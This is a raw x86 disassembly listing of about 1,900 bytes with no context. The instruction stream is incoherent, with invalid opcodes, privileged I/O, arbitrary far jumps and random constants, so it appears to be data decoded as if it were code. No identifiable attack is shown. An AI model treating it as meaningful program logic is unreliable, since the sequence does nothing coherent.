  4239d5:	in     eax,dx
  4239d6:	mov    al,0xa0
  4239d8:	stc    
  4239d9:	ss nop
  4239db:	inc    ebx
  4239dc:	mov    cl,0xcb
  4239de:	(bad)  
  4239df:	ins    BYTE PTR es:[edi],dx
  4239e0:	mul    BYTE PTR [edx]
  4239e2:	cmp    al,0x37
  4239e4:	int    0x11
  4239e6:	ret    0x17e8
  4239e9:	mov    ebx,0xa042306a
  4239ee:	loop   0x423a4c
  4239f0:	mov    eax,ds:0xfdd332bf
  4239f5:	lods   eax,DWORD PTR ds:[esi]
  4239f6:	push   edx
  4239f7:	push   0x677f9d79
  4239fc:	retf   
  4239fd:	or     eax,0xe21631b9
  423a02:	sbb    dh,dl
  423a04:	jae    0x423a60
  423a06:	and    al,0xcb
  423a08:	rol    BYTE PTR [ebx+esi*2],0x22
  423a0c:	jns    0x4239f6
  423a0e:	lods   eax,DWORD PTR ds:[esi]
  423a0f:	push   ebx
  423a10:	lods   al,BYTE PTR ds:[esi]
  423a11:	push   ebx
  423a12:	icebp  
  423a13:	cmp    BYTE PTR [eax+0x6e735ae0],dl
  423a19:	mov    eax,ds:0xf284f758
  423a1e:	stc    
  423a1f:	ja     0x423a25
  423a21:	cli    
  423a22:	das    
  423a23:	xchg   edx,eax
  423a24:	pusha  
  423a25:	sbb    al,0xcc
  423a27:	and    eax,ebp
  423a29:	(bad)  
  423a2a:	cdq    
  423a2b:	cmc    
  423a2c:	mov    edx,0x4516ebbf
  423a31:	rcr    DWORD PTR ds:0x1df2cd34,1
  423a37:	sar    BYTE PTR [ecx+0x3a],1
  423a3a:	push   edx
  423a3b:	xchg   ecx,eax
  423a3c:	mov    eax,0x7257b0cb
  423a41:	daa    
  423a42:	and    al,0x56
  423a44:	push   edi
  423a45:	scas   eax,DWORD PTR es:[edi]
  423a46:	cmp    bh,BYTE PTR [eax-0x1d0dc5d1]
  423a4c:	enter  0xe125,0x57
  423a50:	scas   al,BYTE PTR es:[edi]
  423a51:	mov    eax,ds:0x7382bc5b
  423a56:	sti    
  423a57:	cmp    ecx,eax
  423a59:	inc    ebp
  423a5a:	cdq    
  423a5b:	xchg   ebx,eax
  423a5c:	jle    0x423ab9
  423a5e:	(bad)  
  423a5f:	jle    0x423a7d
  423a61:	aaa    
  423a62:	je     0x423aae
  423a64:	inc    edi
  423a65:	push   ebx
  423a66:	adc    DWORD PTR [esi],ebx
  423a68:	xchg   edi,eax
  423a69:	or     esp,edx
  423a6b:	push   0xa1c58d66
  423a70:	push   es
  423a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a72:	(bad)  
  423a73:	fisubr DWORD PTR [ebx-0x51466c6a]
  423a79:	mov    edx,DWORD PTR [ebp+0x3]
  423a7c:	mov    eax,ds:0xd3f4ce7
  423a81:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  423a83:	and    eax,0xa59bd189
  423a88:	jmp    FWORD PTR ds:[ebp+0x206d520b]
  423a8f:	mov    ds:0xbf79a5dd,eax
  423a94:	add    bl,bh
  423a96:	jnp    0x423aa6
  423a98:	mov    al,0x61
  423a9a:	out    0x24,eax
  423a9c:	icebp  
  423a9d:	adc    DWORD PTR [esi+0x49],esp
  423aa0:	dec    edi
  423aa1:	retf   
  423aa2:	cmp    dl,bl
  423aa4:	ret    
  423aa5:	fisttp QWORD PTR [edx]
  423aa7:	sub    esp,DWORD PTR [esi+0x6ecbb703]
  423aad:	cmp    eax,0x46b6ae54
  423ab2:	js     0x423a35
  423ab4:	add    BYTE PTR [ecx],bl
  423ab6:	sbb    al,0xf4
  423ab8:	cmp    al,0x61
  423aba:	and    DWORD PTR [ecx+0xb],ebx
  423abd:	adc    eax,0x567564ba
  423ac2:	retf   0x639b
  423ac5:	ins    DWORD PTR es:[edi],dx
  423ac6:	aas    
  423ac7:	pop    edx
  423ac8:	push   0x5698cac5
  423acd:	sub    ebp,DWORD PTR [edx]
  423acf:	stos   DWORD PTR es:[edi],eax
  423ad0:	pop    ds
  423ad1:	cli    
  423ad2:	add    esi,DWORD PTR [eax]
  423ad4:	(bad)  
  423ad6:	(bad)  
  423ad7:	dec    ebp
  423ad8:	das    
  423ad9:	push   ebx
  423ada:	push   eax
  423adb:	and    DWORD PTR [esi-0x40],edx
  423ade:	into   
  423adf:	in     eax,0xb1
  423ae1:	sub    cl,al
  423ae3:	push   edi
  423ae4:	lock or al,0x98
  423ae7:	fwait
  423ae8:	xchg   BYTE PTR [eax+0x22],al
  423aeb:	pop    ds
  423aec:	mov    eax,0x13ec05ed
  423af1:	push   esi
  423af2:	mov    dl,0x7b
  423af4:	adc    bh,BYTE PTR [esi+0x15f4cc0]
  423afa:	adc    bl,BYTE PTR [esi]
  423afc:	dec    esp
  423afd:	scas   eax,DWORD PTR es:[edi]
  423afe:	mov    eax,0x40eb2ef
  423b03:	mov    ds:0x888d996,al
  423b08:	fisub  DWORD PTR [edi+0x5e]
  423b0b:	xor    edx,ebx
  423b0d:	into   
  423b0e:	mov    DWORD PTR [ecx+0x5312d2ee],eax
  423b14:	add    ebx,DWORD PTR [ebx+0x58]
  423b17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b18:	mov    edi,0x25f7ae47
  423b1d:	add    al,0x43
  423b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b21:	mov    esp,0x8702286f
  423b26:	rcr    DWORD PTR [ecx],0x66
  423b29:	iret   
  423b2a:	add    al,0x83
  423b2c:	arpl   si,bp
  423b2e:	push   ebp
  423b2f:	mov    ebx,0x8aa3eaaa
  423b34:	es pop esi
  423b36:	dec    ecx
  423b37:	sub    BYTE PTR [edi],0xad
  423b3a:	jle    0x423b68
  423b3c:	scas   eax,DWORD PTR es:[edi]
  423b3d:	jmp    0xe2a08bb0
  423b42:	gs (bad) 
  423b44:	jecxz  0x423acd
  423b46:	mov    ds:0xb1a6b72d,eax
  423b4b:	mov    eax,0xd726a97f
  423b50:	imul   ebx,DWORD PTR [edx+0x42e3bef9],0xffffff82
  423b57:	sub    DWORD PTR [edx+0x613da1b7],0xfed9f25c
  423b61:	xchg   esi,eax
  423b62:	push   eax
  423b63:	jbe    0x423b2c
  423b65:	xor    ebp,DWORD PTR [ebp-0x741ff7e1]
  423b6b:	and    al,0x4
  423b6d:	dec    ebp
  423b6e:	lock dec eax
  423b70:	adc    eax,0x62709599
  423b75:	jl     0x9e3efb93
  423b7b:	sbb    ah,BYTE PTR [edi]
  423b7d:	ja     0x423b0e
  423b7f:	and    dl,ch
  423b81:	lea    ebx,[eax]
  423b83:	in     eax,dx
  423b84:	paddd  mm7,QWORD PTR [esi]
  423b87:	add    edx,DWORD PTR [edi]
  423b89:	aaa    
  423b8a:	out    dx,eax
  423b8b:	xlat   BYTE PTR ds:[ebx]
  423b8c:	jg     0x423bbf
  423b8e:	je     0x423c09
  423b90:	rcr    DWORD PTR [edx+edi*8],cl
  423b93:	pop    ebp
  423b94:	and    eax,0x8bacb4e8
  423b99:	(bad)  
  423b9a:	jbe    0x423bd1
  423b9c:	dec    eax
  423b9d:	sub    al,0xba
  423b9f:	das    
  423ba0:	xchg   edx,eax
  423ba1:	mov    BYTE PTR [ebp+ebx*2+0x6c],bh
  423ba5:	cmp    ecx,ebx
  423ba7:	dec    ebx
  423ba8:	popf   
  423ba9:	std    
  423baa:	rol    DWORD PTR [edi],0xfc
  423bad:	retf   0x1555
  423bb0:	(bad)  
  423bb1:	sbb    eax,0x7b05f40c
  423bb6:	pusha  
  423bb7:	xor    al,0x2e
  423bb9:	hlt    
  423bba:	pusha  
  423bbb:	inc    esi
  423bbc:	xchg   ebp,eax
  423bbd:	push   ds
  423bbe:	push   edx
  423bbf:	scas   eax,DWORD PTR es:[edi]
  423bc0:	inc    esi
  423bc1:	sbb    DWORD PTR [edi-0x1f],esp
  423bc4:	adc    dl,BYTE PTR [ecx]
  423bc6:	xor    ch,BYTE PTR [edi+0x78]
  423bc9:	(bad)  
  423bca:	mov    ebp,0x92654845
  423bcf:	or     eax,0x7690145d
  423bd4:	adc    DWORD PTR [ecx+0x52],edi
  423bd7:	dec    edx
  423bd8:	inc    eax
  423bd9:	inc    ebp
  423bda:	dec    eax
  423bdb:	pop    edi
  423bdc:	or     al,0xd5
  423bde:	fsubr  QWORD PTR [edi+0x1c]
  423be1:	aad    0x47
  423be3:	pop    ebx
  423be4:	shl    BYTE PTR [ebp-0x49],cl
  423be7:	push   esi
  423be8:	add    eax,0x4634b06a
  423bed:	add    DWORD PTR [ecx+edx*8-0x13],ebp
  423bf1:	in     eax,0x5e
  423bf3:	loop   0x423b86
  423bf5:	inc    edi
  423bf6:	fld    DWORD PTR [ecx+ebp*4+0x58]
  423bfa:	stos   BYTE PTR es:[edi],al
  423bfb:	je     0x423c37
  423bfd:	dec    ecx
  423bfe:	das    
  423bff:	cmp    bh,0x99
  423c02:	ins    BYTE PTR es:[edi],dx
  423c03:	(bad)  
  423c04:	out    0x69,al
  423c06:	adc    edx,edi
  423c08:	int3   
  423c09:	mov    esp,0x616a2391
  423c0e:	jo     0x423c83
  423c10:	mov    eax,ds:0x93c5f05f
  423c15:	pop    ds
  423c16:	sahf   
  423c17:	sub    esp,esp
  423c19:	xor    eax,DWORD PTR [ebx]
  423c1b:	call   0x7617eb44
  423c20:	jecxz  0x423c32
  423c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c23:	sbb    BYTE PTR [esi],cl
  423c25:	xor    BYTE PTR [ecx],dl
  423c27:	std    
  423c28:	(bad)  
  423c29:	pop    edx
  423c2a:	jo     0x423c1c
  423c2c:	stc    
  423c2d:	inc    ecx
  423c2e:	adc    ecx,edx
  423c30:	and    cl,ch
  423c32:	int3   
  423c33:	or     BYTE PTR [ebx+0xcff8b2c],ah
  423c39:	pop    esi
  423c3a:	mov    edx,0x4bf6c0c6
  423c3f:	sbb    ecx,DWORD PTR [edi-0x3f716116]
  423c45:	push   ecx
  423c46:	inc    ebp
  423c47:	retf   0xad48
  423c4a:	(bad)  
  423c4b:	inc    esi
  423c4c:	or     eax,0x89119220
  423c51:	push   esi
  423c52:	sub    al,0xb7
  423c54:	dec    eax
  423c55:	adc    ch,BYTE PTR [edi+0x7a]
  423c58:	xor    dl,BYTE PTR [ebx+0x12]
  423c5b:	repnz (bad) 
  423c5d:	mov    ss,WORD PTR [edx+edx*2-0x1dc444a8]
  423c64:	inc    ebp
  423c65:	ret    0x62ac
  423c68:	std    
  423c69:	into   
  423c6a:	xor    eax,0xb349655a
  423c6f:	push   0xb839937f
  423c74:	repz sbb esp,DWORD PTR [edx-0x10]
  423c78:	daa    
  423c79:	(bad)  
  423c7a:	or     eax,0x1d28f917
  423c7f:	loopne 0x423c2b
  423c81:	popf   
  423c82:	fsub   QWORD PTR [edi]
  423c84:	out    0xf5,al
  423c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c87:	mov    eax,0x1ff6248b
  423c8c:	dec    edx
  423c8d:	inc    ebx
  423c8e:	cld    
  423c8f:	adc    DWORD PTR [ebx+edx*1+0x45],edx
  423c93:	call   0x71e6:0x2004f0ed
  423c9a:	fcomp  QWORD PTR [edi-0x36]
  423c9d:	fiadd  DWORD PTR [ebx]
  423c9f:	pop    ecx
  423ca0:	dec    eax
  423ca1:	loopne 0x423cfd
  423ca3:	xchg   BYTE PTR [edx+eax*2-0x35],bh
  423ca7:	add    BYTE PTR [edi],bh
  423ca9:	inc    edx
  423caa:	jp     0x423cc2
  423cac:	(bad)  
  423cad:	cld    
  423cae:	add    eax,0x52912472
  423cb3:	adc    al,0x91
  423cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cb6:	cmp    ah,bh
  423cb8:	fisub  WORD PTR [ecx]
  423cba:	cmp    al,0xf
  423cbc:	nop
  423cbd:	mov    edi,0xab281e23
  423cc2:	in     al,0xe0
  423cc4:	jmp    0x423ca5
  423cc6:	das    
  423cc7:	pop    ss
  423cc8:	dec    eax
  423cc9:	cld    
  423cca:	add    eax,0x372b463a
  423ccf:	jl     0x423c60
  423cd1:	sar    DWORD PTR [edi-0x67],cl
  423cd4:	scas   eax,DWORD PTR es:[edi]
  423cd5:	sub    eax,0x8db0d6be
  423cda:	xlat   BYTE PTR ds:[ebx]
  423cdb:	adc    ebp,DWORD PTR [ecx+0x5312e7fa]
  423ce1:	or     al,0xd7
  423ce3:	mov    ebp,0xc8151498
  423ce8:	stc    
  423ce9:	xor    BYTE PTR [edi-0x23e63efa],bh
  423cef:	(bad)  
  423cf0:	pop    esp
  423cf1:	ja     0x423caf
  423cf3:	or     DWORD PTR [edi-0x72],ebp
  423cf6:	loopne 0x423ca1
  423cf8:	pop    ebx
  423cf9:	ss lock pop esi
  423cfc:	lods   eax,DWORD PTR ds:[esi]
  423cfd:	cmp    BYTE PTR [edx-0x66366c75],dh
  423d03:	imul   edi,DWORD PTR [eax],0x7bc7b5ce
  423d09:	add    eax,0x5e57273f
  423d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d0f:	cli    
  423d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d11:	jmp    0x5486be6d
  423d16:	js     0x423d70
  423d18:	xchg   ebp,eax
  423d19:	les    edx,FWORD PTR [ebx+0x779faa8e]
  423d1f:	push   esi
  423d20:	out    dx,al
  423d21:	xchg   esp,eax
  423d22:	mov    eax,0x5cb46f3c
  423d27:	arpl   WORD PTR [ebx+0x1a],di
  423d2a:	push   0xfd11c64a
  423d2f:	lds    edx,FWORD PTR [edx]
  423d31:	add    edx,esi
  423d33:	fisubr WORD PTR [ebx+0x3cf4977d]
  423d39:	pop    esi
  423d3a:	aam    0x2f
  423d3c:	add    ah,BYTE PTR ds:0x3e3d3678
  423d42:	js     0x423cf7
  423d44:	addr16 (bad) 
  423d46:	std    
  423d47:	sub    al,0x81
  423d4a:	mov    eax,ds:0x2cbd9076
  423d4f:	lahf   
  423d50:	je     0x423d3b
  423d52:	mov    BYTE PTR [esi+0x2e],dh
  423d55:	push   es
  423d56:	scas   al,BYTE PTR es:[edi]
  423d57:	loope  0x423dca
  423d59:	ins    BYTE PTR es:[edi],dx
  423d5a:	sub    al,0x90
  423d5c:	call   0x779b:0xe44b131
  423d63:	pop    ebp
  423d64:	lds    eax,FWORD PTR [edx+0x633f3f4b]
  423d6a:	cmp    DWORD PTR [ebx],edi
  423d6c:	les    ebx,FWORD PTR [ecx]
  423d6e:	cld    
  423d6f:	retf   
  423d70:	ins    BYTE PTR es:[edi],dx
  423d71:	mov    bl,0x41
  423d73:	adc    DWORD PTR [esi-0x46a0527f],eax
  423d79:	jno    0x423d48
  423d7b:	cmc    
  423d7c:	leave  
  423d7d:	mov    eax,ds:0x39063760
  423d82:	pop    es
  423d83:	cmp    ebp,DWORD PTR [edx+0x17]
  423d86:	mov    ah,0xe7
  423d88:	(bad)  
  423d89:	loop   0x423d32
  423d8b:	fiadd  DWORD PTR [eax]
  423d8d:	jmp    0x9c2ca802
  423d92:	mov    bh,0xc9
  423d94:	bt     DWORD PTR [edi-0x70],0xf6
  423d99:	xchg   ebp,eax
  423d9a:	jmp    0x11b5:0x6b896eec
  423da1:	test   eax,0xea7ab8f1
  423da6:	xor    cl,BYTE PTR [edi+eiz*4+0x441213da]
  423dad:	test   al,0xaa
  423daf:	add    al,0xfc
  423db1:	push   ebx
  423db2:	adc    DWORD PTR [ebx+0x4f],0xffffffdc
  423db6:	xor    ch,BYTE PTR ds:[esi]
  423db9:	stc    
  423dba:	xchg   esp,eax
  423dbb:	inc    esi
  423dbc:	daa    
  423dbd:	adc    eax,0xe13ca78c
  423dc2:	and    DWORD PTR [ebp+0x5ed45232],esi
  423dc8:	jg     0x423d8a
  423dca:	add    bh,al
  423dcc:	in     eax,dx
  423dcd:	pop    esi
  423dce:	loope  0x423d53
  423dd0:	scas   eax,DWORD PTR es:[edi]
  423dd1:	xor    ecx,ebx
  423dd3:	stos   DWORD PTR es:[edi],eax
  423dd4:	imul   ecx,DWORD PTR [ebp+ebp*8+0x15],0x47
  423dd9:	inc    eax
  423dda:	imul   ebp,DWORD PTR [esp+ebx*4],0x67e91c05
  423de1:	out    0x39,al
  423de3:	mov    edi,DWORD PTR [esi+0x43]
  423de6:	and    BYTE PTR [esp+ebp*1],bh
  423de9:	jecxz  0x423d7c
  423deb:	mov    esi,0x6e885b9b
  423df0:	es jnp 0x423e3b
  423df3:	push   ds
  423df4:	js     0x423dd6
  423df6:	xor    al,0x7c
  423df8:	fisttp WORD PTR [edi]
  423dfa:	cmp    ah,bl
  423dfc:	xor    ch,BYTE PTR [edi]
  423dfe:	out    0x3c,al
  423e00:	mov    ds:0xeeb61c9b,al
  423e05:	pop    ecx
  423e06:	or     eax,0xb026f33e
  423e0b:	(bad)
  423e0e:	test   DWORD PTR [edi-0x27b1d028],ebp
  423e14:	test   al,0xc8
  423e16:	je     0x423e64
  423e18:	mov    ch,0xa2
  423e1a:	adc    ah,BYTE PTR [edi+ebp*1-0x76e17335]
  423e21:	jmp    0x185d:0x75e4e007
  423e28:	mov    bh,0xde
  423e2a:	popf   
  423e2b:	scas   eax,DWORD PTR es:[edi]
  423e2c:	retf   
  423e2d:	cli    
  423e2e:	shr    DWORD PTR [edi-0x5],cl
  423e31:	pop    ecx
  423e32:	mov    esi,DWORD PTR [ecx]
  423e34:	ss mov bl,0x92
  423e37:	fisttp WORD PTR [ecx]
  423e39:	inc    edx
  423e3a:	neg    DWORD PTR [esi]
  423e3c:	js     0x423df9
  423e3e:	in     al,dx
  423e3f:	push   ebx
  423e40:	call   0xfeee:0x64022e12
  423e47:	adc    DWORD PTR [edi],ecx
  423e49:	rcr    BYTE PTR [edi-0x5a904321],0xda
  423e50:	sbb    DWORD PTR [esp+edi*2],edi
  423e53:	adc    BYTE PTR [esi+0x52],0x70
  423e57:	add    bl,BYTE PTR [ecx]
  423e59:	sub    al,BYTE PTR [ecx+0x5d]
  423e5c:	xor    ch,BYTE PTR [ebx*2-0xae623d0]
  423e63:	popf   
  423e64:	mov    bl,0x91
  423e66:	fild   QWORD PTR [ebx+0x1b6067af]
  423e6c:	test   eax,0x23364e5a
  423e71:	sahf   
  423e72:	jae    0x423e41
  423e74:	or     DWORD PTR [eax+0x79f2b09c],0xb73b9826
  423e7e:	xchg   BYTE PTR [eax],dh
  423e80:	ins    BYTE PTR es:[edi],dx
  423e81:	xchg   edi,eax
  423e82:	dec    edi
  423e83:	and    eax,0x71a4e03b
  423e88:	into   
  423e89:	jne    0x423e1e
  423e8b:	mov    cl,0xe1
  423e8d:	or     eax,0x29e7b442
  423e92:	pop    edx
  423e93:	push   ebx
  423e94:	mov    al,ds:0xcb2290fd
  423e99:	in     eax,dx
  423e9a:	jnp    0x423ea2
  423e9c:	jns    0x423e9f
  423e9e:	add    esi,DWORD PTR [eax-0x3559d854]
  423ea4:	hlt    
  423ea5:	mov    edi,0x977a2ebd
  423eaa:	mov    esi,0x57807497
  423eaf:	push   ebx
  423eb0:	call   0x9d94:0x38d8eb9
  423eb7:	mov    BYTE PTR [edx+0xf],al
  423eba:	loope  0x423efe
  423ebc:	repnz mov ds:0x3fdda9f,al
  423ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ec3:	xchg   ecx,eax
  423ec4:	imul   eax,DWORD PTR [ebx],0xffffffe0
  423ec7:	xchg   esi,eax
  423ec8:	out    0x0,al
  423eca:	scas   al,BYTE PTR es:[edi]
  423ecb:	popf   
  423ecc:	add    edi,ecx
  423ece:	xlat   BYTE PTR ds:[ebx]
  423ecf:	fldenv [ebx+ecx*2-0x776ead59]
  423ed6:	add    eax,0x4fc5c80a
  423edb:	mov    dl,0x3
  423edd:	aam    0xe9
  423edf:	sbb    bh,BYTE PTR [edx-0x3c]
  423ee2:	arpl   WORD PTR [edx-0x2e89e773],di
  423ee8:	arpl   si,dx
  423eea:	jle    0x423f20
  423eec:	pushf  
  423eed:	ins    DWORD PTR es:[edi],dx
  423eee:	test   ch,0x1
  423ef1:	aaa    
  423ef2:	fiadd  WORD PTR [edi]
  423ef4:	xor    eax,0x645f0ced
  423ef9:	stos   BYTE PTR es:[edi],al
  423efa:	ds out dx,al
  423efc:	call   0x8736:0xbc13cc09
  423f03:	or     DWORD PTR [edi+0x51ebdf91],ebx
  423f09:	les    esi,FWORD PTR [edx]
  423f0b:	fistp  WORD PTR [esi-0x4defd6a2]
  423f11:	dec    edx
  423f12:	fdiv   DWORD PTR [ebp+0x53]
  423f15:	sub    cl,BYTE PTR [edi-0x5c]
  423f18:	cmp    eax,0xb97fc2db
  423f1d:	inc    edi
  423f1e:	dec    edx
  423f1f:	jg     0x423ecf
  423f21:	fwait
  423f22:	(bad)  
  423f23:	mov    esi,0xb7f7ddbe
  423f28:	daa    
  423f29:	js     0x423f23
  423f2b:	mov    bl,dl
  423f2d:	idiv   BYTE PTR [edx]
  423f2f:	(bad)  
  423f30:	popf   
  423f31:	jge    0x423f96
  423f33:	pushf  
  423f34:	shl    BYTE PTR [esi+0x7],cl
  423f37:	in     al,0x2
  423f39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f3a:	adc    BYTE PTR [ebp-0x2a01e1c7],bl
  423f40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f41:	cmp    dh,BYTE PTR [edx+0x58dd23fb]
  423f47:	popf   
  423f48:	mov    ah,0xc6
  423f4a:	aam    0x6c
  423f4c:	jo     0x423fc1
  423f4e:	push   0x39ed89b4
  423f53:	pop    ebx
  423f54:	pushf  
  423f55:	rcl    BYTE PTR [edi-0x3c],cl
  423f58:	(bad)  
  423f59:	bnd jbe 0x423eea
  423f5c:	jne    0x423fbe
  423f5e:	mov    DWORD PTR [edx-0x27],edx
  423f61:	retf   
  423f62:	xchg   ebx,eax
  423f63:	pop    es
  423f64:	mov    ebx,DWORD PTR [ecx-0x24c9f903]
  423f6a:	and    DWORD PTR [ebx+0x7d],edx
  423f6d:	sbb    BYTE PTR [edx+0xa0fbe99],dh
  423f73:	js     0x423f5d
  423f75:	inc    esi
  423f76:	add    ch,BYTE PTR ds:0xe720c3da
  423f7c:	xor    al,0xac
  423f7e:	dec    esi
  423f7f:	add    DWORD PTR [eax+esi*1-0x6e],ecx
  423f83:	mov    edx,DWORD PTR [esi+0xdf534fa]
  423f89:	aas    
  423f8a:	and    al,0xf5
  423f8c:	aam    0x23
  423f8e:	das    
  423f8f:	call   FWORD PTR [eax+0x7c8a6b9c]
  423f95:	out    0xfc,al
  423f97:	xor    esp,DWORD PTR [ecx+0x19]
  423f9a:	xor    eax,0x8db5dbd
  423f9f:	popa   
  423fa0:	fild   DWORD PTR [ebx+0x6aa09c63]
  423fa6:	pop    ecx
  423fa7:	push   edx
  423fa8:	jns    0x423f62
  423faa:	mov    ds:0xafd1ca90,al
  423faf:	fnstenv [esi]
  423fb1:	and    edi,eax
  423fb3:	mov    WORD PTR [edi+eiz*1],cs
  423fb6:	aad    0xb7
  423fb8:	int3   
  423fb9:	addr16 out dx,al
  423fbb:	les    esi,FWORD PTR [ebx]
  423fbd:	imul   eax,DWORD PTR [ebx-0x28],0x59
  423fc1:	and    DWORD PTR [edx+0x55],ebx
  423fc4:	jmp    0x608c:0xdc818b3a
  423fcb:	pop    eax
  423fcc:	mov    ds:0x1cf2a898,eax
  423fd1:	inc    ebp
  423fd2:	sub    dl,dl
  423fd4:	es in  al,0xdc
  423fd7:	inc    esi
  423fd8:	and    bl,BYTE PTR [edi]
  423fda:	(bad)  
  423fdb:	cmc    
  423fdc:	fld    QWORD PTR [edi+0x30272153]
  423fe2:	xchg   edi,eax
  423fe3:	fisttp WORD PTR [eax+eiz*8+0x269483e6]
  423fea:	fld    DWORD PTR [edi+0xdc5f0cd]
  423ff0:	and    al,0x2f
  423ff2:	jle    0x423fe1
  423ff4:	ins    BYTE PTR es:[edi],dx
  423ff5:	and    al,0x2
  423ff7:	mov    bh,0x58
  423ff9:	loop   0x42400c
  423ffb:	sbb    al,0x32
  423ffd:	sar    BYTE PTR [ebx+0x7d],cl
  424000:	in     al,0xb2
  424002:	mov    ch,0xde
  424004:	push   esp
  424005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424006:	call   FWORD PTR [edx]
  424008:	mov    ah,0x64
  42400a:	xchg   edi,eax
  42400b:	push   esi
  42400c:	mov    eax,ds:0x91f3e129
  424011:	dec    esp
  424012:	sub    al,BYTE PTR [edi]
  424014:	mov    bl,bh
  424016:	js     0x423ff0
  424018:	in     al,dx
  424019:	and    DWORD PTR [edx+0x7f21d5fe],0xa
  424020:	sub    eax,0x32282242
  424025:	cld    
  424026:	addr16 inc bp
  424029:	and    ecx,DWORD PTR [edi-0x19]
  42402c:	xchg   edx,eax
  42402d:	dec    edi
  42402e:	test   eax,0xda34c7b6
  424033:	inc    ebp
  424034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424035:	dec    esp
  424036:	inc    esp
  424037:	arpl   WORD PTR [eax+eiz*4],sp
  42403a:	add    DWORD PTR [ebx-0x4e],esi
  42403d:	xchg   esi,eax
  42403e:	arpl   WORD PTR [edx],si
  424040:	mov    dh,0x30
  424042:	enter  0x5450,0xf2
  424046:	in     al,dx
  424047:	test   BYTE PTR [edi],bh
  424049:	cmp    BYTE PTR [ecx+esi*4-0x7c],al
  42404d:	mov    esp,0xd1dfd955
  424052:	push   esp
  424053:	scas   eax,DWORD PTR es:[edi]
  424054:	mov    dl,0xeb
  424056:	or     BYTE PTR [esi-0x71],ch
  424059:	inc    eax
  42405a:	sub    bl,bh
  42405c:	shl    DWORD PTR ds:0x41a3c4a8,1
  424062:	push   ecx
  424063:	adc    al,dh
  424065:	lahf   
  424066:	shl    BYTE PTR [ebx-0x66367240],0xd0
  42406d:	sahf   
  42406e:	aas    
  42406f:	ds mov edi,0xa0e98706
  424075:	xchg   esi,ebx
  424077:	jge    0x42400d
  424079:	xchg   BYTE PTR ds:0x824213c8,ch
  42407f:	aam    0x73
  424081:	dec    eax
  424082:	jl     0x4240c7
  424084:	mov    ebx,0xf06b1b5b
  424089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42408a:	shl    BYTE PTR [ecx+0x4c],0x8e
  42408e:	mov    BYTE PTR [edi+eiz*1],0xaa
  424092:	lahf   
  424093:	add    al,cl
  424095:	test   eax,0x10f17b11
  42409a:	jb     0x4240d8
  42409c:	das    
  42409d:	loope  0x4240f7
  42409f:	xchg   edx,eax
  4240a0:	inc    esp
  4240a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240a2:	rol    ebp,1
  4240a4:	ja     0x4240f0
  4240a6:	into   
  4240a7:	inc    sp
  4240a9:	scas   al,BYTE PTR es:[edi]
  4240aa:	mov    dh,0x31
  4240ac:	mov    al,ds:0x1209f7f
  4240b1:	push   ebx
  4240b2:	mov    ah,0xd6
  4240b4:	cmp    BYTE PTR [eax+0x7fa7590e],al
  4240ba:	dec    eax
  4240bb:	inc    ecx
  4240bc:	fcom   DWORD PTR [esi]
  4240be:	imul   edi,DWORD PTR [ecx+0x2d],0xcf250155
  4240c5:	xor    al,0x33
  4240c7:	ss cmp dl,ah
  4240ca:	sbb    DWORD PTR [ebx],esp
  4240cc:	mov    eax,0x54decbb
  4240d1:	pusha  
  4240d2:	and    edi,DWORD PTR [edx]
  4240d4:	adc    esi,ebx
  4240d6:	dec    esi
  4240d7:	mov    ds:0x3563a663,al
  4240dc:	xor    bl,BYTE PTR [esi-0x39]
  4240df:	add    DWORD PTR [ecx-0x6043deee],ebx
  4240e5:	mov    esp,0x4a2a318
  4240ea:	inc    esi
  4240eb:	jbe    0x4240c4
  4240ed:	mov    bl,0xef
  4240ef:	add    esp,DWORD PTR [ecx-0x13404e62]
  4240f5:	in     eax,dx
  4240f6:	inc    esi
  4240f7:	adc    edx,DWORD PTR [ecx+0x2d]
  4240fa:	out    dx,eax
  4240fb:	mov    ds:0xe7daa56e,eax
  424100:	mov    DWORD PTR [esi-0x59],ebx
  424103:	xor    bl,BYTE PTR [edi+edi*1-0xddc0727]
  42410a:	or     al,0x75
  42410c:	ret    
  42410d:	int    0x99
  42410f:	das    
  424110:	and    ch,BYTE PTR [esp+edi*2]
  424113:	data16 mov BYTE PTR [edi],bh
  424116:	lods   eax,DWORD PTR ds:[esi]
  424117:	mov    al,0xf4
  424119:	push   esi
  42411a:	pop    ecx
  42411b:	div    eax
  42411d:	xchg   edx,eax
  42411e:	lea    ecx,[edi+ebp*8+0x5125f409]
  424125:	jae    0x424187
  424127:	xor    ch,BYTE PTR [eax-0x59565fb]
  42412d:	test   eax,0x9dd82151
  424132:	inc    esp
  424133:	mov    al,ds:0xddd4072
  424138:	pop    ds
  424139:	shl    DWORD PTR [edx+0x5a],cl
  42413c:	push   eax
  42413d:	stos   BYTE PTR es:[edi],al
  42413e:	cmp    BYTE PTR [edi-0x1f74e925],dl
  424144:	ins    DWORD PTR es:[edi],dx
  424145:	arpl   WORD PTR [eax-0x45],si
  424148:	cwde   
  424149:	dec    eax
  42414a:	xchg   esi,eax
  42414b:	xlat   BYTE PTR ds:[ebx]
  42414c:	push   edx
  42414d:	push   ecx
  42414e:	adc    dl,dl
  424150:	fisttp DWORD PTR [eax]
  424152:	retf   0x6cfc
  424155:	int    0x64
  424157:	xor    eax,0x2f14fb8
  42415c:	imul   ecx,DWORD PTR [edi+eax*8-0x5ef8aca4],0x51ab7331
  424167:	add    DWORD PTR [ecx+0x496858a5],0x2f460682
  424171:	fbstp  TBYTE PTR [edi+0x5435406e]
  424177:	push   ebp
  424178:	push   es
  424179:	mov    ecx,0xbd8589c6
  42417e:	test   al,0x66
